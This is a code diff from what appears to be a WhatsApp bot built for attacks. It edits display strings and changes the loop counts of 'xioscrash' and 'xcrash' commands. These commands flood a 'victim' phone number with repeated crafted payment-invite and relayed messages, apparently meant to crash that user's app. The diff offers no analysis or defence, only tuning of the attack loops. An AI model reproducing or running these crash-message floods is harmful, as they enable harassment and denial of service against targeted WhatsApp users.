@@ -164,7 +164,7 @@ var xeonlod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳‎  𓋹 ..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -1940,7 +1940,7 @@ amount = "50"
 for (let i = 0; i < amount; i++) {
 XeonBotInc.relayMessage(from,{
 extendedTextMessage:{
-"text":'.',
+"text":' Ꭲriʙᴀl-Ꮇisᴛ 𓋹 ',
 "contextInfo": {
 "stanzaId": victim,
 "participant": victim,
@@ -2010,7 +2010,7 @@ case 'xioscrash':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "50"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 XeonBotInc.relayMessage(victim,{ 
 "paymentInviteMessage": {
@@ -2040,7 +2040,7 @@ case 'xcrash':{
 if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "30"
 for (let i = 0; i < amount; i++) {
 XeonyCrashy(pushname,victim)
 await sleep(3000)
